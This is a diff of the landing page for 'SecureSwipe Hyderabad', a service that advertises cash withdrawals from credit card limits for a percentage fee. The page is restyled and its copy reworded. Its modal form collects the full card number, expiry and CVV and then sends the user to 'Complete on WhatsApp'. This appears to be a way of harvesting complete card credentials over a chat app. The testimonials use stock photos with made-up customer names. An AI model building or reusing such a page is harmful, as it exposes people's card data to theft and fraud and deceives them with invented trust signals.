@@ -6,7 +6,7 @@
     <title>SecureSwipe Hyderabad | Professional Credit Card Services</title>
     <!-- Bootstrap 5 CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <!-- Sophisticated Inter & Jakarta Fonts -->
+    <!-- Premium Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@700;800&display=swap" rel="stylesheet">
     <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -15,6 +15,7 @@
         :root {
             --brand-primary: #0f172a;
             --brand-accent: #2563eb;
+            --brand-success: #10b981;
             --brand-warning: #f59e0b;
             --surface-50: #f8fafc;
             --surface-100: #f1f5f9;
@@ -25,10 +26,11 @@
         body {
             font-family: 'Inter', sans-serif;
             color: var(--text-main);
-            background-color: #fff;
+            background-color: #ffffff;
             -webkit-font-smoothing: antialiased;
             overflow-x: hidden;
-            padding-bottom: 80px; /* Space for sticky bar */
+            margin: 0;
+            padding: 0;
         }
 
         h1, h2, h3, h4, .navbar-brand {
@@ -36,7 +38,7 @@
             letter-spacing: -0.02em;
         }
 
-        /* Clean Navbar */
+        /* Clean Fixed Navbar */
         .navbar {
             padding: 1.25rem 0;
             background: rgba(255, 255, 255, 0.9) !important;
@@ -45,16 +47,16 @@
             z-index: 1060;
         }
 
-        /* Hero */
+        /* Hero Styling */
         .hero-section {
-            padding: 120px 0 60px;
+            padding: 140px 0 60px;
             background: radial-gradient(circle at 100% 0%, #eff6ff 0%, #ffffff 60%);
         }
 
-        .hyd-label {
+        .hyd-badge {
             background: #fffbeb;
             color: #b45309;
-            padding: 6px 14px;
+            padding: 8px 16px;
             border-radius: 100px;
             font-weight: 700;
             font-size: 11px;
@@ -66,19 +68,20 @@
             margin-bottom: 1.5rem;
         }
 
-        /* The Redesigned "Heart of the Page" */
+        /* FIXED: Promo Card with Equal Button Sizes */
         .promo-card {
             background: var(--brand-primary);
             border-radius: 32px;
             padding: 40px 30px;
             color: white;
-            position: relative;
-            box-shadow: 0 30px 60px -12px rgba(15, 23, 42, 0.3);
+            box-shadow: 0 30px 60px -12px rgba(15, 23, 42, 0.4);
             text-align: center;
+            position: relative;
+            overflow: hidden;
         }
 
-        .main-rate-value {
-            font-size: 4.5rem;
+        .main-rate {
+            font-size: 5rem;
             font-weight: 800;
             color: var(--brand-warning);
             line-height: 1;
@@ -86,52 +89,46 @@
         }
 
         .dialogue-bubble {
-            background: rgba(255, 255, 255, 0.08);
+            background: rgba(255, 255, 255, 0.07);
             border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 20px;
-            padding: 20px;
-            margin: 20px 0;
-            font-size: 1rem;
+            padding: 24px;
+            margin: 25px 0;
+            font-size: 1.05rem;
             line-height: 1.5;
         }
 
-        .promo-btns {
+        /* Equal Size Buttons Fix */
+        .promo-button-container {
             display: flex;
             gap: 12px;
+            width: 100%;
+        }
+
+        .btn-promo-action {
+            flex: 1; /* Ensures both take 50% space */
+            padding: 16px;
+            border-radius: 16px;
+            font-weight: 700;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
             justify-content: center;
+            transition: all 0.2s ease;
+            border: none;
         }
 
-        .btn-promo-wa {
-            background: #fff;
-            color: var(--brand-accent);
-            border-radius: 14px;
-            padding: 12px 20px;
-            font-weight: 700;
-            flex: 1;
-            text-decoration: none;
-            transition: 0.2s;
-        }
+        .btn-wa-light { background: #ffffff; color: #25d366; }
+        .btn-call-gold { background: var(--brand-warning); color: #000; }
 
-        .btn-promo-call {
-            background: var(--brand-warning);
-            color: #000;
-            border-radius: 14px;
-            padding: 12px 20px;
-            font-weight: 700;
-            flex: 1;
-            text-decoration: none;
-            transition: 0.2s;
-        }
-
-        /* Rate Cards - Fixed Spacing */
+        /* Standard Rate Cards */
         .rate-option-card {
             background: white;
             border: 1px solid var(--surface-100);
-            border-radius: 24px;
-            padding: 25px 15px;
+            border-radius: 28px;
+            padding: 30px 20px;
             text-align: center;
-            transition: 0.3s ease;
-            cursor: pointer;
+            transition: all 0.3s ease;
             text-decoration: none;
             color: inherit;
             display: block;
@@ -139,90 +136,57 @@
 
         .rate-option-card:hover {
             border-color: var(--brand-accent);
-            transform: translateY(-5px);
-            box-shadow: 0 15px 30px rgba(0,0,0,0.05);
+            transform: translateY(-8px);
+            box-shadow: 0 20px 30px -10px rgba(0,0,0,0.05);
         }
 
-        .rate-option-card img { width: 44px; margin-bottom: 12px; }
-        .rate-option-card .value { font-size: 2.2rem; font-weight: 800; color: var(--brand-accent); }
+        .rate-option-card .value { font-size: 2.5rem; font-weight: 800; color: var(--brand-accent); }
 
-        /* Process Steps */
-        .process-img-box {
-            width: 100%;
-            height: 160px;
-            border-radius: 20px;
-            object-fit: cover;
-            margin-bottom: 15px;
-        }
+        /* Human Touch: Process & Reviews */
+        .process-img { width: 100%; height: 180px; border-radius: 24px; object-fit: cover; margin-bottom: 20px; }
+        .step-circle { width: 32px; height: 32px; background: var(--brand-accent); color: white; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 800; margin: 0 auto 15px; }
 
-        .step-tag {
-            width: 28px; height: 28px;
-            background: var(--brand-accent);
-            color: white;
-            border-radius: 6px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 800;
-            margin: 0 auto 10px;
-            font-size: 0.8rem;
-        }
+        .testimonial-card { background: var(--surface-50); border-radius: 28px; padding: 35px; border: 1px solid var(--surface-100); height: 100%; }
+        .client-avatar { width: 64px; height: 64px; border-radius: 50%; object-fit: cover; margin-bottom: 15px; border: 3px solid #fff; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
 
-        /* Testimonials */
-        .review-card {
-            background: var(--surface-50);
-            border-radius: 24px;
-            padding: 30px;
-            border: 1px solid var(--surface-100);
-            height: 100%;
-        }
-
-        .avatar-lg {
-            width: 64px; height: 64px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-bottom: 15px;
-            border: 3px solid white;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-        }
-
-        /* Footer - Redesigned */
+        /* Footer Cleanup */
         .site-footer {
             background: var(--brand-primary);
             color: #94a3b8;
-            padding: 60px 0 40px;
+            padding: 80px 0 40px;
+            margin-top: 0;
             border-top: 1px solid rgba(255,255,255,0.05);
         }
 
-        .footer-logo { font-size: 1.5rem; color: white; font-weight: 800; margin-bottom: 15px; }
-
-        /* Mobile Action Bar */
-        .mobile-action-bar {
+        /* FIXED: Professional Sticky Bar */
+        .sticky-action-bar {
             position: fixed;
-            bottom: 15px; left: 15px; right: 15px;
-            background: rgba(15, 23, 42, 0.98);
+            bottom: 0; left: 0; width: 100%;
+            background: rgba(255, 255, 255, 0.98);
             backdrop-filter: blur(10px);
-            padding: 10px;
-            border-radius: 20px;
+            padding: 12px 16px;
             display: flex;
-            gap: 10px;
+            gap: 12px;
             z-index: 2000;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            box-shadow: 0 -10px 30px rgba(0,0,0,0.1);
+            border-top: 1px solid var(--surface-100);
         }
 
-        .mobile-action-bar .btn {
-            flex: 1; border-radius: 14px; padding: 12px; font-weight: 700; font-size: 0.9rem;
+        .sticky-action-bar .btn {
+            flex: 1; border-radius: 14px; padding: 14px; font-weight: 700; font-size: 0.95rem;
         }
 
-        /* Modal */
-        .modal-content { border-radius: 30px; border: none; overflow: hidden; }
-        .calc-panel { background: var(--brand-accent); color: white; border-radius: 20px; padding: 20px; margin-top: 15px; }
+        /* Modal styling */
+        .modal-content { border-radius: 32px; border: none; overflow: hidden; }
+        .calc-box { background: var(--brand-accent); color: white; border-radius: 20px; padding: 20px; margin-top: 20px; }
 
         @media (max-width: 768px) {
+            body { padding-bottom: 85px; } /* Space for sticky bar */
             .hero-section { padding: 100px 0 40px; }
-            .display-3 { font-size: 2.4rem; }
-            .main-rate-value { font-size: 3.5rem; }
-            .promo-btns { flex-direction: column; }
+            .display-3 { font-size: 2.3rem; }
+            .main-rate { font-size: 3.8rem; }
+            .promo-button-container { flex-direction: column; }
+            .promo-card { padding: 35px 20px; }
         }
     </style>
 </head>
@@ -238,8 +202,8 @@
                 <span class="fw-800 fs-5">Secure<span class="text-primary">Swipe</span></span>
             </a>
             <div class="d-none d-lg-block">
-                <span class="text-muted small fw-600 me-3"><i class="fas fa-location-dot text-danger"></i> Hyderabad Support</span>
-                <a href="tel:+919866783703" class="btn btn-primary btn-sm rounded-pill px-4 fw-700">Call Now</a>
+                <span class="text-muted small fw-700 me-3"><i class="fas fa-location-dot text-danger"></i> Serving Hyderabad & Secunderabad</span>
+                <a href="tel:+919866783703" class="btn btn-primary btn-sm rounded-pill px-4 fw-700 shadow-sm">Talk to Agent</a>
             </div>
         </div>
     </nav>
@@ -248,42 +212,39 @@
     <section class="hero-section">
         <div class="container px-4">
             <div class="row align-items-center">
-                <div class="col-lg-6 mb-5 mb-lg-0 text-center text-lg-start">
-                    <div class="hyd-label">
-                        <i class="fas fa-shield-check me-2 text-primary"></i> 10,000+ Satisfied Customers
+                <div class="col-lg-6 text-center text-lg-start mb-5 mb-lg-0">
+                    <div class="hyd-badge">
+                        <i class="fas fa-heart me-2 text-danger"></i> Trusted by 10,000+ Happy Customers
                     </div>
-                    <h1 class="display-3 fw-800 mb-4">Hyderabad's Trusted Credit Card Service.</h1>
-                    <p class="text-muted fs-5 mb-5 mx-auto mx-lg-0" style="max-width: 500px;">
-                        Professional, safe, and immediate card solutions with same-day settlement across Hyderabad.
+                    <h1 class="display-3 fw-800 mb-4">Hyderabad's Trusted <br class="d-none d-lg-block"> Credit Card Service.</h1>
+                    <p class="text-muted fs-5 mb-5 mx-auto mx-lg-0" style="max-width: 520px;">
+                        Professional, safe, and immediate card solutions with same-day settlement. We help you manage your cash flow with zero hassle.
                     </p>
-                    <div class="d-flex justify-content-center justify-content-lg-start align-items-center gap-3">
-                        <div class="d-flex">
-                            <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=100&h=100&fit=crop" class="rounded-circle border border-white" style="width:36px; margin-right:-10px">
-                            <img src="https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?w=100&h=100&fit=crop" class="rounded-circle border border-white" style="width:36px; margin-right:-10px">
-                            <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&h=100&fit=crop" class="rounded-circle border border-white" style="width:36px">
-                        </div>
-                        <span class="small fw-700 text-primary">Top Rated in Telangana</span>
+                    <div class="d-none d-lg-flex align-items-center gap-3">
+                         <img src="https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=400&q=80" class="rounded-4 shadow-lg" style="width: 150px; height: 80px; object-fit: cover;">
+                         <span class="fw-800 text-primary small">Professional Financial Support</span>
                     </div>
                 </div>
 
                 <div class="col-lg-6">
-                    <!-- The Heart Section -->
+                    <!-- The Heart Card -->
                     <div class="promo-card">
-                        <div class="text-uppercase small fw-800 tracking-wider opacity-50 mb-2" style="font-size: 10px;">Fastest Settlement In Hyderabad</div>
-                        <h2 class="h5 fw-800 mb-0">Withdrawals & Bill Payments</h2>
-                        <div class="main-rate-value">2.5%</div>
+                        <div class="text-uppercase small fw-800 tracking-wider opacity-50 mb-1" style="font-size: 10px;">Immediate Bank Settlement</div>
+                        <h2 class="h5 fw-800 mt-2 mb-0">Withdrawals & Bill Payments</h2>
+                        <div class="main-rate">2.5%</div>
                         
                         <div class="dialogue-bubble">
                             "Why worry about card payments? 💳 <br>
                             <strong>We're here for you!</strong> We pay your bills & you withdraw instantly at just <strong>2.5%</strong>." 🚀
                         </div>
 
-                        <div class="promo-btns">
-                            <a href="https://wa.me/919866783703" class="btn-promo-wa">
-                                <i class="fab fa-whatsapp me-2"></i> WhatsApp
+                        <!-- Same Size Buttons Grid -->
+                        <div class="promo-button-container">
+                            <a href="https://wa.me/919866783703" class="btn-promo-action btn-wa-light">
+                                <i class="fab fa-whatsapp me-2"></i> WhatsApp Now
                             </a>
-                            <a href="tel:+919866783703" class="btn-promo-call">
-                                <i class="fas fa-phone-alt me-2"></i> Call Now
+                            <a href="tel:+919866783703" class="btn-promo-action btn-call-gold">
+                                <i class="fas fa-phone-alt me-2"></i> Call Support
                             </a>
                         </div>
                     </div>
@@ -292,82 +253,77 @@
         </div>
     </section>
 
-    <!-- Satisfaction Visual -->
+    <!-- Satisfaction visual -->
     <section class="py-5">
         <div class="container px-4">
             <div class="row align-items-center g-5">
-                <div class="col-md-6 order-md-2 text-center">
-                    <img src="https://images.unsplash.com/photo-1522202176988-66273c2fd55f?w=800&q=80" class="img-fluid rounded-4 shadow-lg" alt="Happy Team">
+                <div class="col-md-6 order-md-2">
+                    <img src="https://images.unsplash.com/photo-1600880212319-784439767b31?q=80&w=800" class="img-fluid rounded-5 shadow-xl" alt="Happy Clients">
                 </div>
                 <div class="col-md-6 text-center text-md-start">
                     <h2 class="fw-800 mb-4">Fast Cash for Happy Faces.</h2>
-                    <p class="text-muted fs-5">Our process is built on trust. We serve thousands of business owners and individuals daily with 100% security and zero hidden fees.</p>
-                    <div class="mt-4">
-                        <span class="badge bg-success-subtle text-success p-2 px-3 rounded-pill fw-bold">
-                            <i class="fas fa-user-check me-2"></i> Verified Satisfaction
-                        </span>
-                    </div>
+                    <p class="text-muted fs-5">We bridge your card limits to bank cash within minutes. No more worrying about monthly payments or urgent liquidity. Join 5000+ satisfied business owners in Hyderabad.</p>
                 </div>
             </div>
         </div>
     </section>
 
     <!-- Standard Rates -->
-    <section class="py-5 bg-light rounded-5 mx-2 mx-md-5">
+    <section class="py-5 bg-light rounded-5 mx-2 mx-lg-5">
         <div class="container px-4">
             <div class="text-center mb-5">
-                <h3 class="fw-800">Standard Rates</h3>
-                <p class="text-muted small">No hidden charges. Instant bank settlement.</p>
+                <h3 class="fw-800">Standard Swipe Rates</h3>
+                <p class="text-muted small">No hidden charges. Instant settlement guaranteed.</p>
             </div>
             <div class="row g-3 justify-content-center">
-                <div class="col-6 col-md-4">
+                <div class="col-6 col-md-5 col-lg-4">
                     <a href="#" class="rate-option-card" data-bs-toggle="modal" data-bs-target="#swipeModal" data-card-type="VISA & RUPAY" data-percent="1.7">
-                        <img src="https://img.icons8.com/color/96/visa.png" alt="Visa">
+                        <img src="https://img.icons8.com/color/96/visa.png" width="48" class="mb-2">
                         <div class="small fw-800 text-muted opacity-50">VISA & RUPAY</div>
                         <div class="value">1.7%</div>
-                        <div class="text-primary fw-700 small mt-2">Swipe Now <i class="fas fa-arrow-right ms-1"></i></div>
+                        <div class="text-primary fw-700 small mt-2">Start Processing <i class="fas fa-arrow-right ms-1"></i></div>
                     </a>
                 </div>
-                <div class="col-6 col-md-4">
+                <div class="col-6 col-md-5 col-lg-4">
                     <a href="#" class="rate-option-card" data-bs-toggle="modal" data-bs-target="#swipeModal" data-card-type="MASTERCARD" data-percent="2.0">
-                        <img src="https://img.icons8.com/color/96/mastercard.png" alt="MasterCard">
+                        <img src="https://img.icons8.com/color/96/mastercard.png" width="48" class="mb-2">
                         <div class="small fw-800 text-muted opacity-50">MASTERCARD</div>
                         <div class="value">2.0%</div>
-                        <div class="text-primary fw-700 small mt-2">Swipe Now <i class="fas fa-arrow-right ms-1"></i></div>
+                        <div class="text-primary fw-700 small mt-2">Start Processing <i class="fas fa-arrow-right ms-1"></i></div>
                     </a>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Professional Process -->
+    <!-- Process -->
     <section class="py-5 mt-5">
         <div class="container px-4 text-center">
-            <h2 class="fw-800 mb-5">Professional Process</h2>
+            <h4 class="fw-800 mb-5">Simple 4-Step Process</h4>
             <div class="row g-4">
                 <div class="col-6 col-lg-3">
-                    <img src="https://images.unsplash.com/photo-1556740738-b6a63e27c4df?w=400&h=300&fit=crop" class="process-img-box" alt="Consult">
-                    <div class="step-tag">01</div>
+                    <img src="https://images.unsplash.com/photo-1556740738-b6a63e27c4df?w=400&q=80" class="process-img shadow-sm" alt="Talk to us">
+                    <div class="step-circle">1</div>
                     <h6 class="fw-800">Consult</h6>
-                    <p class="small text-muted">Local Support</p>
+                    <p class="small text-muted">Local support</p>
                 </div>
                 <div class="col-6 col-lg-3">
-                    <img src="https://images.unsplash.com/photo-1450101499163-c8848c66ca85?w=400&h=300&fit=crop" class="process-img-box" alt="Verify">
-                    <div class="step-tag">02</div>
+                    <img src="https://images.unsplash.com/photo-1554224155-8d04cb21cd6c?w=400&q=80" class="process-img shadow-sm" alt="Verify">
+                    <div class="step-circle">2</div>
                     <h6 class="fw-800">Verify</h6>
-                    <p class="small text-muted">Instant Check</p>
+                    <p class="small text-muted">Instant check</p>
                 </div>
                 <div class="col-6 col-lg-3">
-                    <img src="https://images.unsplash.com/photo-1556740758-90de374c12ad?w=400&h=300&fit=crop" class="process-img-box" alt="Swipe">
-                    <div class="step-tag">03</div>
+                    <img src="https://images.unsplash.com/photo-1556740758-90de374c12ad?w=400&q=80" class="process-img shadow-sm" alt="Card Swipe">
+                    <div class="step-circle">3</div>
                     <h6 class="fw-800">Swipe</h6>
                     <p class="small text-muted">Authorized POS</p>
                 </div>
                 <div class="col-6 col-lg-3">
-                    <img src="https://images.unsplash.com/photo-1593642532454-e138e28a63f4?w=400&h=300&fit=crop" class="process-img-box" alt="Settlement">
-                    <div class="step-tag">04</div>
-                    <h6 class="fw-800">Settlement</h6>
-                    <p class="small text-muted">Bank Transfer</p>
+                    <img src="https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=400&q=80" class="process-img shadow-sm" alt="Receive Cash">
+                    <div class="step-circle">4</div>
+                    <h6 class="fw-800">Receive</h6>
+                    <p class="small text-muted">IMPS Settlement</p>
                 </div>
             </div>
         </div>
@@ -376,30 +332,30 @@
     <!-- Reviews -->
     <section class="py-5">
         <div class="container px-4">
-            <h2 class="fw-800 text-center mb-5">Customer Experiences</h2>
-            <div class="row g-4 text-center text-md-start">
+            <h4 class="fw-800 text-center mb-5">Trusted by Hyderabad Customers</h4>
+            <div class="row g-4">
                 <div class="col-md-4">
-                    <div class="review-card">
-                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&h=100&fit=crop" class="avatar-lg" alt="Ravi">
+                    <div class="testimonial-card">
+                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&q=80" class="client-avatar" alt="Ravi">
                         <div class="text-warning mb-2 small"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                        <p class="small text-muted mb-0">"Excellent and fast. Best rates in Kukatpally. Settlement was truly instant."</p>
-                        <h6 class="fw-800 small mt-3 mb-0">Ravi – Kukatpally</h6>
+                        <p class="small text-muted mb-3">"Polished and fast. Best swipe rates in Kukatpally. Settlement was instant and the staff was very professional."</p>
+                        <h6 class="fw-800 mb-0 small text-primary">Ravi – Kukatpally</h6>
                     </div>
                 </div>
                 <div class="col-md-4">
-                    <div class="review-card">
-                        <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100&h=100&fit=crop" class="avatar-lg" alt="Imran">
+                    <div class="testimonial-card">
+                        <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100&q=80" class="client-avatar" alt="Imran">
                         <div class="text-warning mb-2 small"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                        <p class="small text-muted mb-0">"Extremely professional. As a business owner, their 2.5% bill payment is a lifesaver."</p>
-                        <h6 class="fw-800 small mt-3 mb-0">Imran – Tolichowki</h6>
+                        <p class="small text-muted mb-3">"Discrete and professional. Same day settlement guaranteed in Tolichowki. Very satisfied with the quick cash flow."</p>
+                        <h6 class="fw-800 mb-0 small text-primary">Imran – Tolichowki</h6>
                     </div>
                 </div>
                 <div class="col-md-4">
-                    <div class="review-card">
-                        <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=100&h=100&fit=crop" class="avatar-lg" alt="Suresh">
+                    <div class="testimonial-card">
+                        <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=100&q=80" class="client-avatar" alt="Suresh">
                         <div class="text-warning mb-2 small"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                        <p class="small text-muted mb-0">"Reliable and honest. Highly recommend for any card withdrawal needs."</p>
-                        <h6 class="fw-800 small mt-3 mb-0">Suresh – LB Nagar</h6>
+                        <p class="small text-muted mb-3">"2.5% flat rate is perfect for my business bills. Great support in LB Nagar area. I highly recommend them."</p>
+                        <h6 class="fw-800 mb-0 small text-primary">Suresh – LB Nagar</h6>
                     </div>
                 </div>
             </div>
@@ -408,34 +364,35 @@
 
     <!-- Footer -->
     <footer class="site-footer">
-        <div class="container px-4">
-            <div class="row g-4 text-center text-md-start">
+        <div class="container px-4 text-center text-md-start">
+            <div class="row g-5 align-items-center">
                 <div class="col-md-6">
-                    <div class="footer-logo">SecureSwipe <span class="text-primary">HYD</span></div>
-                    <p class="small" style="max-width: 400px;">
-                        The most trusted Credit Card bridge service in Greater Hyderabad. Serving Banjara Hills, Jubilee Hills, Gachibowli, Secunderabad, and more.
+                    <div class="text-white fw-800 fs-4 mb-3">SecureSwipe <span class="text-primary">HYD</span></div>
+                    <p class="small" style="max-width: 420px; color: #64748b;">
+                        The premier Credit Card bridge service in Hyderabad. Serving all major zones including Banjara Hills, Jubilee Hills, Gachibowli, and Secunderabad.
                     </p>
                 </div>
                 <div class="col-md-6 text-md-end">
-                    <div class="text-white fw-700 mb-2">Support: +91 98667 83703</div>
-                    <p class="small">&copy; 2025 SecureSwipe Hyderabad. All rights reserved.</p>
+                    <div class="mb-2 text-white">Direct Support: <span class="fw-800">+91 98667 83703</span></div>
+                    <p class="small text-muted mb-0">All services subject to bank rules & local regulations.</p>
+                    <p class="small text-muted mt-3">&copy; 2025 SecureSwipe Hyderabad. All rights reserved.</p>
                 </div>
             </div>
         </div>
     </footer>
 
-    <!-- Mobile Action Bar -->
-    <div class="mobile-action-bar d-lg-none">
-        <a href="tel:+919866783703" class="btn btn-call"><i class="fas fa-phone-alt me-2"></i> Call Now</a>
-        <a href="https://wa.me/919866783703" class="btn btn-wa"><i class="fab fa-whatsapp me-2"></i> WhatsApp</a>
+    <!-- STICKY ACTION BAR - CLEAN & PROFESSIONAL -->
+    <div class="sticky-action-bar d-lg-none">
+        <a href="tel:+919866783703" class="btn btn-primary"><i class="fas fa-phone-alt me-2"></i> Call Now</a>
+        <a href="https://wa.me/919866783703" class="btn btn-success text-white" style="background:#22c55e;"><i class="fab fa-whatsapp me-2"></i> WhatsApp</a>
     </div>
 
-    <!-- Modal -->
+    <!-- Processing Modal -->
     <div class="modal fade" id="swipeModal" tabindex="-1">
         <div class="modal-dialog modal-dialog-centered mx-3">
-            <div class="modal-content shadow-lg">
+            <div class="modal-content shadow-lg border-0">
                 <div class="modal-header px-4 py-3 bg-primary text-white border-0">
-                    <h6 class="modal-title fw-800">Secure Swipe Processing</h6>
+                    <h6 class="modal-title fw-800">Secure Payment Request</h6>
                     <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                 </div>
                 <div class="modal-body p-4">
@@ -444,50 +401,29 @@
                         <input type="hidden" id="selectedPercent">
                         
                         <div class="mb-3">
-                            <label class="form-label small fw-800 text-muted">Withdrawal Amount (₹)</label>
+                            <label class="form-label small fw-800 text-muted">Amount to Withdraw (₹)</label>
                             <input type="number" id="withdrawAmount" class="form-control" placeholder="e.g. 10000" required>
                         </div>
-                        
                         <div class="mb-3" id="brandContainer">
-                            <label class="form-label small fw-800 text-muted">Card Brand</label>
-                            <select id="cardBrand" class="form-select">
-                                <option value="VISA">VISA</option>
-                                <option value="RUPAY">RUPAY</option>
-                            </select>
+                            <label class="form-label small fw-800 text-muted">Select Brand</label>
+                            <select id="cardBrand" class="form-select"><option value="VISA">VISA</option><option value="RUPAY">RUPAY</option></select>
                         </div>
-
                         <div class="mb-3">
                             <label class="form-label small fw-800 text-muted">Card Number</label>
                             <input type="text" id="cardNum" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19" required>
                         </div>
-                        
                         <div class="row g-2 mb-3">
-                            <div class="col-6">
-                                <label class="form-label small fw-800 text-muted">Expiry</label>
-                                <input type="text" id="expiry" class="form-control" placeholder="MM/YY" maxlength="5" required>
-                            </div>
-                            <div class="col-6">
-                                <label class="form-label small fw-800 text-muted">CVV</label>
-                                <input type="password" id="cvv" class="form-control" placeholder="123" maxlength="3" required>
-                            </div>
+                            <div class="col-6"><label class="form-label small fw-800 text-muted">Expiry</label><input type="text" id="expiry" class="form-control" placeholder="MM/YY" maxlength="5" required></div>
+                            <div class="col-6"><label class="form-label small fw-800 text-muted">CVV</label><input type="password" id="cvv" class="form-control" placeholder="123" maxlength="3" required></div>
                         </div>
 
-                        <div class="calc-panel" id="calcSection">
-                            <div class="d-flex justify-content-between mb-1 small">
-                                <span>Withdraw Amount:</span>
-                                <span id="dispAmount">₹0</span>
-                            </div>
-                            <div class="d-flex justify-content-between mb-2 small opacity-75">
-                                <span id="dispChargeLabel">Fee (0%):</span>
-                                <span id="dispFee">₹0</span>
-                            </div>
-                            <div class="d-flex justify-content-between fw-800 fs-5 border-top border-white border-opacity-25 pt-2">
-                                <span>You Get:</span>
-                                <span id="dispNet">₹0</span>
-                            </div>
+                        <div class="calc-box" id="calcSection">
+                            <div class="d-flex justify-content-between mb-1 small"><span>Principal:</span><span id="dispAmount">₹0</span></div>
+                            <div class="d-flex justify-content-between mb-2 small opacity-75"><span id="dispChargeLabel">Fee (0%):</span><span id="dispFee">₹0</span></div>
+                            <div class="d-flex justify-content-between fw-800 fs-5 border-top border-white border-opacity-25 pt-2"><span>Net Settlement:</span><span id="dispNet">₹0</span></div>
                         </div>
 
-                        <button type="submit" class="btn btn-primary w-100 py-3 mt-4 rounded-3 fw-700 shadow">Process on WhatsApp <i class="fab fa-whatsapp ms-2"></i></button>
+                        <button type="submit" class="btn btn-primary w-100 py-3 mt-4 rounded-3 fw-700 shadow">Complete on WhatsApp <i class="fab fa-whatsapp ms-2"></i></button>
                     </form>
                 </div>
             </div>
@@ -500,14 +436,13 @@
         document.getElementById('cardNum').addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
         });
-
         document.getElementById('expiry').addEventListener('input', (e) => {
             let v = e.target.value.replace(/\D/g, '');
             if(v.length >= 2) e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4);
             else e.target.value = v;
         });
 
-        // Calc
+        // Calculator
         const amtIn = document.getElementById('withdrawAmount');
         const updateCalc = () => {
             const a = parseFloat(amtIn.value) || 0;
@@ -515,13 +450,13 @@
             const f = (a * p) / 100;
             const n = a - f;
             document.getElementById('dispAmount').innerText = '₹' + a.toLocaleString('en-IN');
-            document.getElementById('dispChargeLabel').innerText = `Fee (${p}%):`;
+            document.getElementById('dispChargeLabel').innerText = `Service Fee (${p}%):`;
             document.getElementById('dispFee').innerText = '₹' + f.toLocaleString('en-IN', {minimumFractionDigits: 2});
             document.getElementById('dispNet').innerText = '₹' + n.toLocaleString('en-IN', {minimumFractionDigits: 2});
         };
         amtIn.addEventListener('input', updateCalc);
 
-        // Modal
+        // Modal triggers
         document.getElementById('swipeModal').addEventListener('show.bs.modal', (e) => {
             const b = e.relatedTarget;
             const t = b.getAttribute('data-card-type');
